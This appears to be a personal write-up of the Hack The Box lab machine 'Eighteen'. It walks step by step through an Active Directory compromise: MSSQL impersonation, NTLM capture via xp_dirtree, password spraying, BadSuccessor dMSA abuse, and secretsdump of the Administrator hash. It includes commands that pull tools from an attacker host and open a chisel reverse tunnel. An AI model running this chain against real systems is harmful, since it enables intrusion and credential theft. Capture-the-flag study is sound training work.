- - - 
created : 20-11-2025 

Tags : #easy 

Released on 15 Nov 2025 (Season 9)
- - - 
# MACHINE INFORMATION

As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: `kevin / iNa2we6haRj2gaw!`
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eighteen/user]
└─$ rustscan -a eighteen.htb -- -A

Open 10.10.11.95:80
Open 10.10.11.95:1433
Open 10.10.11.95:5985

PORT     STATE SERVICE  REASON          VERSION
80/tcp   open  http     syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Welcome - eighteen.htb
|_http-server-header: Microsoft-IIS/10.0

1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100

5985/tcp open  http     syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

Add `dc01.eighteen.htb` to `/etc/hosts` file.
# Enumeration
## HTTP (80)

Login page:

![Pasted image 20251120191111.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251120191111.png)

Register:

![Pasted image 20251120192114.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251120192114.png)

You can enter the admin panel with [SQL Injection](../../../3%20-%20Tags/Hacking%20Concepts/SQL%20Injection.md), but the website is a distraction trap (rabbit hole) .
## MSSQL

Use `impacket` to get a shell with the given credentials:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eighteen/user]
└─$ impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@eighteen.htb              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands

SQL (kevin  guest@master)> enum_db      
name                is_trustworthy_on   
-----------------   -----------------   
master                              0   
tempdb                              0   
model                               0   
msdb                                1   
financial_planner                   0   

SQL (kevin  guest@master)> enum_links 
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (kevin  guest@master)> enable_xp_cmdshell  
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (kevin  guest@master)> use financial_planner
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context. 

SQL (kevin  guest@master)> select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
login    login_type   password_hash   create_date   modify_date   status     
------   ----------   -------------   -----------   -----------   --------   
appdev   SQL_LOGIN             NULL   2025-09-12 01:38:53   2025-11-20 15:05:57   b'Enabled'   
kevin    SQL_LOGIN             NULL   2025-09-12 01:38:48   2025-11-20 17:28:05   b'Enabled'   
sa       SQL_LOGIN             NULL   2003-04-08 09:10:35   2025-11-20 15:39:12   b'Enabled' 
```

Try steal **NTLM** with `xp_dirtree`:

```bash
SQL (kevin  guest@master)> exec master.dbo.xp_dirtree '\\10.10.14.21\test'
subdirectory   depth   
------------   -----  
```

Check listener:

```bash
└─$ sudo responder -I tun0
[SMB] NTLMv2-SSP Hash     : mssqlsvc::EIGHTEEN:HTB{REDACTED_HASH}    
```

Can't crack it.
# Exploit

With this SQL command we check if we can impersonate another user:

```bash
SQL (kevin  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'         
name                                                                                                   
------   
appdev   
```

Or just use `enum_impersonate`:

```bash
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev   
```

So we can impersonate `appdev`:

```bash
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev'

SQL (appdev  appdev@master)> SELECT SYSTEM_USER
------                                                                                                 
appdev                                                                                                 
SQL (appdev  appdev@master)> SELECT IS_SRVROLEMEMBER('sysadmin')                                       
-                                                                                                      
0                              
```

We check `xp_cmdshell`:

```bash
SQL (appdev  appdev@master)> EXEC sp_helprotect 'xp_cmdshell'
Owner   Object        Grantee   Grantor   ProtectType   Action    Column   
-----   -----------   -------   -------   -----------   -------   ------   
sys     xp_cmdshell   appdev    dbo       b'Grant     '   Execute   .  

SQL (appdev  appdev@master)> sp_configure 'xp_cmdshell', '1'
ERROR(DC01): Line 105: User does not have permission to perform this action.

SQL (appdev  appdev@master)> RECONFIGURE
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

We can't configure it or use it,  but `appdev` can use the `financial_planner` db and steal Admin's **NTLM** hash:

```bash
pbkdf2:sha256:600000$HTB{REDACTED_HASH}    
```

This `admin` hash can be cracked,but it needs some manipulation first, we'll use this python tool:  https://gist.github.com/marcos-venicius/858061c6c5709ad1a2f0e305b65a27f8

This converts `pbkdf2` to `base64` [SHA-256](../../../3%20-%20Tags/Hacking%20Concepts/SHA-256.md):

```bash
└─$ git clone https://gist.github.com/marcos-venicius/858061c6c5709ad1a2f0e305b65a27f8
Clone in '858061c6c5709ad1a2f0e305b65a27f8' in corso...
remote: Enumerating objects: 3, done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 3 (from 1)

┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Eighteen/user/858061c6c5709ad1a2f0e305b65a27f8]
└─$ python3 pbkdf2-to-hashcat.py 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$HTB{REDACTED_HASH}    '
sha256:600000:QU10enRlUUlHNHTB{REDACTED_HASH}    
```

Make sure to put the hash in single quotes or else it will fail to parse the $.

Now we can save it and load it into [Hashcat](../../../3%20-%20Tags/Hacking%20Tools/Hashcat.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eighteen/user]
└─$ hashcat admin_hash /usr/share/wordlists/rockyou.txt 

sha256:600000:HTB{REDACTED_HASH}:HTB{REDACTED_PASSWD}    
   
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: REDACTED_HASH
Time.Started.....: Thu Nov 20 20:57:45 2025 (9 secs)
Time.Estimated...: Thu Nov 20 20:57:54 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       95 H/s (13.93ms) @ Accel:73 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 876/14344385 (0.01%)
Rejected.........: 0/876 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:599000-599999
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> melvin
Hardware.Mon.#01.: Temp: 96c Util: 89%
```

Now use `nxc mssql` to get a list of users to attempt password spraying:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eighteen/user]
└─$ nxc mssql 10.10.11.95 -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute 2000
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.10.11.95     1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
MSSQL       10.10.11.95     1433   DC01             500: EIGHTEEN\Administrator
MSSQL       10.10.11.95     1433   DC01             501: EIGHTEEN\Guest
MSSQL       10.10.11.95     1433   DC01             502: EIGHTEEN\krbtgt
MSSQL       10.10.11.95     1433   DC01             512: EIGHTEEN\Domain Admins
MSSQL       10.10.11.95     1433   DC01             513: EIGHTEEN\Domain Users
MSSQL       10.10.11.95     1433   DC01             514: EIGHTEEN\Domain Guests
MSSQL       10.10.11.95     1433   DC01             515: EIGHTEEN\Domain Computers
MSSQL       10.10.11.95     1433   DC01             516: EIGHTEEN\Domain Controllers
MSSQL       10.10.11.95     1433   DC01             517: EIGHTEEN\Cert Publishers
MSSQL       10.10.11.95     1433   DC01             518: EIGHTEEN\Schema Admins
MSSQL       10.10.11.95     1433   DC01             519: EIGHTEEN\Enterprise Admins
MSSQL       10.10.11.95     1433   DC01             520: EIGHTEEN\Group Policy Creator Owners
MSSQL       10.10.11.95     1433   DC01             521: EIGHTEEN\Read-only Domain Controllers
MSSQL       10.10.11.95     1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers
MSSQL       10.10.11.95     1433   DC01             525: EIGHTEEN\Protected Users
MSSQL       10.10.11.95     1433   DC01             526: EIGHTEEN\Key Admins
MSSQL       10.10.11.95     1433   DC01             527: EIGHTEEN\Enterprise Key Admins
MSSQL       10.10.11.95     1433   DC01             528: EIGHTEEN\Forest Trust Accounts
MSSQL       10.10.11.95     1433   DC01             529: EIGHTEEN\External Trust Accounts
MSSQL       10.10.11.95     1433   DC01             553: EIGHTEEN\RAS and IAS Servers
MSSQL       10.10.11.95     1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group
MSSQL       10.10.11.95     1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group
MSSQL       10.10.11.95     1433   DC01             1000: EIGHTEEN\DC01$
MSSQL       10.10.11.95     1433   DC01             1101: EIGHTEEN\DnsAdmins
MSSQL       10.10.11.95     1433   DC01             1102: EIGHTEEN\DnsUpdateProxy
MSSQL       10.10.11.95     1433   DC01             1601: EIGHTEEN\mssqlsvc
MSSQL       10.10.11.95     1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
MSSQL       10.10.11.95     1433   DC01             1603: EIGHTEEN\HR
MSSQL       10.10.11.95     1433   DC01             1604: EIGHTEEN\IT
MSSQL       10.10.11.95     1433   DC01             1605: EIGHTEEN\Finance
MSSQL       10.10.11.95     1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.10.11.95     1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.10.11.95     1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.10.11.95     1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.10.11.95     1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.10.11.95     1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.10.11.95     1433   DC01             1612: EIGHTEEN\dave.green
```

Save the list:

```bash
└─$ cat users    
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
```

And perform a [Password spraying](../../../3%20-%20Tags/Hacking%20Concepts/Password%20spraying.md) attack:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eighteen/user]
└─$ while read user; do
    nxc mssql 10.10.11.95 -u "$user" -p "HTB{REDACTED_PASSWD}"
done < users.txt
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [-] eighteen.htb\jane.smith:iloveyou1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [-] eighteen.htb\alice.jones:iloveyou1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')

MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [-] eighteen.htb\adam.scott:iloveyou1 (Login failed for user 'EIGHTEEN\adam.scott'. Please try again with or without '--local-auth')

MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [-] eighteen.htb\bob.brown:iloveyou1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [-] eighteen.htb\carol.white:iloveyou1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [-] eighteen.htb\dave.green:iloveyou1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
```

`adam.scott` with the cracked password is a valid combination, we can see the different response in the failure, now try request a ticket:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eighteen/user]
└─$ impacket-getTGT eighteen.htb/'adam.scott':'HTB{REDACTED_PASSWD}' -dc-ip 10.10.11.95
```

This isn't working for me, can't `ntp update` or `faketime`, we'll request a ticket from [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) shell directly later.
## Evil-WinRM

Now we use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) to access, if requesting a ticket does not work, use plain-text credentials:

```powershell
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eighteen/user]
└─$ evil-winrm -u 'adam.scott' -p 'HTB{REDACTED_PASSWD}' -i dc.eighteen.htb 

*Evil-WinRM* PS C:\Users\adam.scott\Documents> cat ../Desktop/user.txt
5fa47698207e8a358f1bbe4be4a804cb

    HTB{REDACTED_FLAG}
```

User flag owned.
# Privilege Escalation

Use [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md) or similar to gather info and find the escalation path:

![Pasted image 20251122133404.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251122133404.png)

Must read:

https://kreep.in/badsuccessor-abusing-dmsas-for-ad-domination/

https://www.rbtsec.com/blog/badsuccessor-escalating-privileges-via-dmsa-in-windows-server-2025/

The [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md) PoC:

https://github.com/ibaiC/BadSuccessor

Make sure the target OU is "OU=Staff,DC=eighteen,DC=htb"  (./BadSuccessor.exe find):

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Downloads\privesc> wget http://10.10.14.21/BadSuccessor.exe -o BadSuccessor.exe 

*Evil-WinRM* PS C:\Users\adam.scott\Downloads\privesc> ./BadSuccessor.exe find
 

 ______           __ _______
|   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
|   __ < |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
|______/ |___._|_____|_______||_____|____|_____|_____|_____|_____|_____|__|

Researcher: @YuG0rd
Author: @kreepsec


[*] OUs you have write access to:
    -> OU=Domain Controllers,DC=eighteen,DC=htb
       Privileges: GenericWrite, GenericAll
    -> OU=Staff,DC=eighteen,DC=htb
       Privileges: GenericWrite, GenericAll, CreateChild


*Evil-WinRM* PS C:\Users\adam.scott\Downloads\privesc> ./BadSuccessor.exe escalate -targetOU "OU=Staff,DC=eighteen,DC=htb" -dmsa EvilDMSA -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname EvilDMSA.eighteen.htb -user adam.scott -dc-ip DC01.eighteen.htb

 ______           __ _______
|   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
|   __ < |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
|______/ |___._|_____|_______||_____|____|_____|_____|_____|_____|_____|__|

Researcher: @YuG0rd
Author: @kreepsec

[*] Creating dMSA object...
[*] Inheriting target user privileges
    -> msDS-ManagedAccountPrecededByLink = CN=Administrator,CN=Users,DC=eighteen,DC=htb
    -> msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
[*] Setting PrincipalsAllowedToRetrieveManagedPassword
    -> msDS-GroupMSAMembership = adam.scott
[+] Setting userAccountControl attribute
[+] Setting msDS-SupportedEncryptionTypes attribute

[+] Created dMSA 'EvilDMSA' in 'OU=Staff,DC=eighteen,DC=htb', linked to 'CN=Administrator,CN=Users,DC=eighteen,DC=htb' (DC: DC01.eighteen.htb)

[*] Phase 4: Use Rubeus or Kerbeus BOF to retrieve TGS and Password Hash
    -> Step 1: Find luid of krbtgt ticket
     Rubeus:      .\Rubeus.exe triage
     Kerbeus BOF: krb_triage BOF

    -> Step 2: Get TGT of Windows 2025/24H2 system with a delegated MSA setup and migration finished.
     Rubeus:      .\Rubeus.exe dump /luid:<luid> /service:krbtgt /nowrap
     Kerbeus BOF: krb_dump /luid:<luid>

    -> Step 3: Use ticket to get a TGS ( Requires Rubeus PR: https://github.com/GhostPack/Rubeus/pull/194 )
    Rubeus:      .\Rubeus.exe asktgs /ticket:TICKET_FROM_ABOVE /targetuser:EvilDMSA$ /service:krbtgt/domain.local /dmsa /dc:<DC hostname> /opsec /nowrap
```

Once the malicious `dMSA` is created, extract credentials using standard Kerberos attacks, BadSuccessor requires **Rubeus PR #194**: https://github.com/GhostPack/Rubeus/pull/194, to be able to compile that you need a Windows machine (or use a VM):

```bash
## Compress and transfer
─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Downloads\privesc> wget http://10.10.14.21/Rubeus.exe -o Rubeus.exe

*Evil-WinRM* PS C:\Users\adam.scott\Downloads\privesc> .\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


Action: Triage Kerberos Tickets (Current User)

[*] Current LUID    : 0x607dc

 ---------------------------------------
 | LUID | UserName | Service | EndTime |
 ---------------------------------------
 ---------------------------------------

 
./Rubeus.exe dump /luid:0x607dc /service:krbtgt /nowrap ## This will not work on Evil-WinRM 
```

We're on Evil-WinRM so we are _not using Kerberos authentication_, we're using **NTLM** to create the WinRM session.  
Because of that:
- the session has **no Kerberos tickets**
- Rubeus has **nothing to triage**
- no TGT exists to dump and `dump` fails
- Rubeus **must read LSASS memory** and WinRM shell ≠ elevated session, even if you're a domain admin.
This is 100% normal.
## Rubeus TGT for adam

We can request now a TGT for `adam.scott` with `Rubeus`: 

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Downloads\privesc> .\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /domain:eighteen.htb /enctype:aes256 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: HTB{REDACTED_HASH}
[*] Building AS-REQ (w/ preauth) for: 'eighteen.htb\adam.scott'
[*] Using domain controller: fe80::4829:9730:a1c4:364f%3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFpjCCBaKgAwIBBaEDAgEWooIEqTCCBKVhggShMIIEnaADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZWlnaHRlZW4uaHRio4IEYTCCBF2gAwIBEqEDAgECooIETwSCBEvtFd0ZCWN/5e8fUpTKzpsR8LPp7fICq3SEtwpFW5K++CU+0Xrt9zCcWJTNylAvEDgExukC5L8uk+/xInul/FM/MNuvst0gUTzWxVZDPEJvC0uHExxVAk7prPnzB4p0vrqkagdrI7cqf3JKVlwVFxF5wOAOxcmn1cOR4lQXZnbRocjwVfZpy+TLZKIV/VH+0mIxuwOoiV1VczHH1W77WL7KFh/FG8iJ47rQFXzVrsZ17RoPtWJ4TQLXuwi+H4UO2Wz4uG6TUZ7Pnw1uuplbh4IWBzqmHmiVnSKlqoBsAmIHOLX8swiWXyr3426VqRqHJ0oE/IydqFK4acGMxfB1zDd5Y0ZKzJcFg0vWB3DexX6It79SEbUGgbe2npTPARRtT7AREFaw2+tJ3Ymm2DycVRXRFVaomSezqNy7wSB+1FMpUb2YKN6BqmbWBWJLA65/WARc3GctSaAi3b+wgCiGEmY2A1uh3jf6UHWwH8GlQSDhXX6J9meO7a7wmulakn+976+I6tvg45em1DQUJAzNVoJGhZIX64PiW4oRHI0DG1R2BFdhhz/TVTC28vFhwaE3nQ99HARoNBLqUve1ysp3ykKVpQoCO2mCLvF4U8GSBOV774MxsXkiddQ2pAcrRqAozjccFYziolqOkZm7oAMwk9YwN/RylUkhEpndAUZ5b7udz+Q+evOqzfgCr572QvpMusog6xQrS1DsAN+jhEWwDNIWdHyOAF3adMH//eKR2YFSySr/otU+WfUW3kDH26/VuurRMeAm7S6c35zKSaIjwodW1h9wIXVP5m1K/Y HTB{REDACTED_HASH}

  ServiceName              :  krbtgt/eighteen.htb
  ServiceRealm             :  EIGHTEEN.HTB
  UserName                 :  adam.scott
  UserRealm                :  EIGHTEEN.HTB
  StartTime                :  11/23/2025 11:03:52 AM
  EndTime                  :  11/23/2025 9:03:52 PM
  RenewTill                :  11/30/2025 11:03:52 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  tL7R5 HTB{REDACTED_HASH}
  ASREP (key)              :  02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5
```

We save it:

```bash
─$ nano kirbi.b64       

─$ base64 -d kirbi.b64 > adam.kirbi
```

Use [Metasploit-Framework (MSF)](../../../3%20-%20Tags/Hacking%20Tools/Metasploit-Framework%20(MSF).md) module to convert it in `.ccache` to be able to re-use it: 

```bash
└─$ sudo msfconsole

msf > ls
[*] exec: ls

adam.kirbi  BadSuccessor  kirbi.b64  ligolo-ng
msf > use auxiliary/admin/kerberos/ticket_converter
msf auxiliary(admin/kerberos/ticket_converter) > set OutputPath ./adam.ccache
OutputPath => ./adam.ccache
msf auxiliary(admin/kerberos/ticket_converter) > set InputPath ./adam.kirbi
InputPath => ./adam.kirbi
msf auxiliary(admin/kerberos/ticket_converter) > run
[*] Converting from kirbi to ccache
[*] File written to /home/mdn0x/HTB/Machines/Eighteen/root/adam.ccache
[*] Auxiliary module execution completed

msf > exit
 
─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Eighteen/root/adam.ccache 
─$ klist
Ticket cache: FILE:/home/mdn0x/HTB/Machines/Eighteen/root/adam.ccache
Default principal: adam.scott@EIGHTEEN.HTB

Valid starting       Expires              Service principal
23/11/2025 20:03:52  24/11/2025 06:03:52  krbtgt/eighteen.htb@EIGHTEEN.HTB
        renew until 30/11/2025 20:03:52
```

Now we can use it.
## Using Rubeus PR 194 or Impacket for dMSA TGS

We need a ticket for the new created evil-machine (this only works with compiled pull 194 and you can compile it on windows VM)

But you can proxychains `impacket-requestST` and `-dmsa` flag (Impacket v0.13.0) using a `chisel` or `ligolo` tunnel to use the `adam.ccache` TGT. I will follow this path:

1. Set up a `chisel` tunnel

```bash
└─$ git clone https://github.com/jpillora/chisel.git 

# Build 
─$ go build -o chisel .
─$ file chisel
chisel: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=47490c9dd0df160e522c93dd82cfc612c374ede4, with debug_info, not stripped
─$ chmod +x chisel

# exe for Windows

└─$ GOOS=windows GOARCH=amd64 go build -o chisel.exe .

# Transfer the binary with a server
└─$  python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
# From Windows PowerShell
*Evil-WinRM* PS C:\Users\adam.scott\Downloads\privesc> Invoke-WebRequest -Uri http://10.10.14.21:/chisel.exe -OutFile chisel.exe

# Set up the tunnel
└─$ ./chisel server -p 8000 --reverse
2025/11/23 14:29:37 server: Reverse tunnelling enabled
2025/11/23 14:29:37 server: Fingerprint dwFUm0t3FF4maa+WT/OZHIyhNs/DglehczS3jJDwqjM=
2025/11/23 14:29:37 server: Listening on http://0.0.0.0:8000

# Catch it on WinRM
*Evil-WinRM* PS C:\Users\adam.scott\Downloads\privesc> ./chisel.exe client 10.10.14.121:8000 R:socks
```

2. Modify `proxychains4.conf` file:

```bash
socks5  127.0.0.1 1080  # At the bottom of the file, comment others out
```

4.  Fix clock skew and request the TGS for `EvilDMSA` through:

```bash
*Evil-WinRM* PS C:\Users\adam.scott\Downloads\privesc> (Get-Date).ToUniversalTime()
Sunday, November 23, 2025 8:22:11 PM

# Fix clock skew
sudo timedatectl set-ntp false
sudo timedatectl set-local-rtc 0 --adjust-system-clock
sudo date -s "2025-11-23 20:23:00"

─$ proxychains getST.py -impersonate 'EvilDMSA$' -dmsa -k -no-pass eighteen.htb/adam.scott -self
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating EvilDMSA$
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  eighteen.htb:88  ...  OK
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:572a40c2ae8fdb11a732492763028553d904ad68c3fe482e751d2a2d7b80bf51
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:875dcd567fd39ff6c967949024b54916
[*] EncryptionTypes.rc4_hmac:5f718968b45b317acbee270cc3177e9e
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in EvilDMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache

└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Eighteen/root/EvilDMSA\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache 
```

After you got the ticket for your `dMSA` account all you need to do is `secretsdump` to dump the administrator hash:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eighteen/root]
└─$  proxychains secretsdump.py -k -no-pass dc01.eighteen.htb -just-dc-user Administrator
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:49674  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
[*] Kerberos keys grabbed
